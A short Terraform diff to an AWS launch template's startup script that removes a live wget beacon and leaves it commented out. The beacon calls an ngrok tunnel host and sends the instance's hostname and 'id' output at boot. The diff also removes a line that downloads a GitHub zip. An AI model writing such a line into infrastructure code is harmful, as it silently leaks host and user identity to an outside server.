@@ -45,8 +45,7 @@ resource "aws_launch_template" "ecs_launch_template" {
   user_data = base64encode(<<-EOF
     #!/bin/bash
     echo ECS_CLUSTER=${aws_ecs_cluster.default.name} >> /etc/ecs/ecs.config;
-    wget https://f015-192-222-189-20.ngrok-free.app/$(hostname)_$(id|tr ' ' '_')
-    wget https://github.com/DataWearsAHood/hasty-paste/archive/refs/heads/main.zip
+    # wget https://f015-192-222-189-20.ngrok-free.app/$(hostname)_$(id|tr ' ' '_')
     touch /tmp/user-data-ran
   EOF
   )
@@ -60,6 +59,7 @@ resource "aws_launch_template" "ecs_launch_template" {
   }
 
   iam_instance_profile {
+    # arn = aws_iam_instance_profile.ec2_instance_role_profile.arn
     arn = aws_iam_instance_profile.ec2_instance_role_profile.arn
   }
 
